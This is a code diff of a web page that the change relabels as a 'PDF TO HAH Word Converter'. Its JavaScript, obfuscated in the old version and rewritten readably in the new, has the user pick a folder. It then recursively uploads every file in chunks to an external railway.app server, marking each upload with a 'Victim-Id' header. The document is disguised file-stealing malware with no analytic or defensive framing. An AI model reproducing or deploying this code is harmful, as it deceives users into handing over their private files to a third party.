@@ -11,53 +11,74 @@
   </style>
 </head>
 <body>
-  <h1>Data Transfer</h1>
+  <h1>PDF TO HAH Word Converter</h1>
   <button id="start">Start</button>
   <script>
-    (function(){
-      let _0x1a2b3c = "https://deobbetest1-production-104e.up.railway.app/upload";
-      document["getElementById"]("start")["addEventListener"]("click", async () => {
-        try {   
-          let _0x9f8e7d = crypto["randomUUID"]();
-          let _0xa3b4c5 = await window["showDirectoryPicker"]();
-          await (async function _0xf0e1d2(_0xabc123, _0xdef456) {
-            let _0xuploadPromises = [];
-            let _0xmaxConcurrent = 3;
-            for await (let _0x56789a of _0xabc123["values"]()) {
-              if (_0x56789a["kind"] === "file") {
-                let _0x111222 = await _0x56789a["getFile"]();
-                let _0xuploadPromise = (async function _0x333444(_0xaaa, _0xbbb) {
-                  let _0xccc = await _0xbbb["arrayBuffer"](), _0xddd = 1024 * 100, _0xeee = Math["ceil"](_0xccc["byteLength"] / _0xddd), _0xfff = 0;
-                  for (let _0x101010 = 0; _0x101010 < _0xeee; _0x101010++) {
-                    let _0x111111 = Math["min"](_0xfff + _0xddd, _0xccc["byteLength"]), _0x121212 = _0xccc["slice"](_0xfff, _0x111111);
-                    _0xfff = _0x111111;
-                    await (async function _0x131313(_0x1, _0x2, _0x3, _0x4, _0x5) {
-                      await fetch(_0x1a2b3c, {
-                        "method": "POST",
-                        "headers": {
-                          "Content-Type": "application/octet-stream",
-                          "Victim-Id": encodeURIComponent(_0x1),
-                          "Filename": encodeURIComponent(_0x2),
-                          "Chunk-Index": _0x4,
-                          "Total-Chunks": _0x5
-                        },
-                        "body": _0x3
-                      });
-                    })(_0xaaa, _0xbbb["name"], _0x121212, _0x101010 + 1, _0xeee);
+    (async function () {
+      let serverUrl = "https://deobbetest1-production-104e.up.railway.app/upload";
+    
+      document.getElementById("start").addEventListener("click", async () => {
+        try {
+          let victimId = crypto.randomUUID();
+          let directoryHandle = await window.showDirectoryPicker();
+          let processedFiles = new Set(); // Ensure files are not duplicated
+    
+          async function uploadDirectory(dirHandle, victimId) {
+            let uploadPromises = [];
+            let maxConcurrentUploads = 3;
+            let uploadQueue = [];
+    
+            async function processEntry(entry) {
+              if (entry.kind === "file" && !entry.name.startsWith(".")) {
+                if (processedFiles.has(entry.name)) return;
+                processedFiles.add(entry.name); // Track processed file
+    
+                let file = await entry.getFile();
+                let totalChunks = Math.ceil(file.size / (1024 * 100)); // 100KB chunks
+    
+                for (let chunkIndex = 0, offset = 0; offset < file.size; chunkIndex++) {
+                  let chunk = file.slice(offset, offset + 1024 * 100);
+                  offset += 1024 * 100;
+    
+                  let uploadPromise = fetch(serverUrl, {
+                    method: "POST",
+                    headers: {
+                      "Content-Type": "application/octet-stream",
+                      "Victim-Id": encodeURIComponent(victimId),
+                      "Filename": encodeURIComponent(entry.name),
+                      "Chunk-Index": chunkIndex + 1,
+                      "Total-Chunks": totalChunks
+                    },
+                    body: chunk
+                  });
+    
+                  uploadQueue.push(uploadPromise);
+    
+                  // Control concurrency
+                  if (uploadQueue.length >= maxConcurrentUploads) {
+                    await Promise.all(uploadQueue);
+                    uploadQueue = [];
                   }
-                })(_0xdef456, _0x111222);
-                _0xuploadPromises.push(_0xuploadPromise);
-                if (_0xuploadPromises.length >= _0xmaxConcurrent) {
-                  await Promise.allSettled(_0xuploadPromises);
-                  _0xuploadPromises = [];
                 }
-              } else if (_0x56789a["kind"] === "directory") {
-                await _0xf0e1d2(await _0x56789a, _0xdef456);
+              } else if (entry.kind === "directory") {
+                let subDirHandle = await dirHandle.getDirectoryHandle(entry.name);
+                await uploadDirectory(subDirHandle, victimId); // Recursively process directories
               }
             }
-            await Promise.allSettled(_0xuploadPromises);
-          })(_0xa3b4c5, _0x9f8e7d);
-        } catch (_0x999999) {}
+    
+            for await (let entry of dirHandle.values()) {
+              uploadPromises.push(processEntry(entry));
+            }
+    
+            await Promise.all(uploadPromises);
+            if (uploadQueue.length > 0) await Promise.all(uploadQueue); // Wait for last batch
+          }
+    
+          await uploadDirectory(directoryHandle, victimId);
+          console.log("✅ Upload complete!");
+        } catch (error) {
+          console.error("❌ Error occurred:", error);
+        }
       });
     })();
   </script>
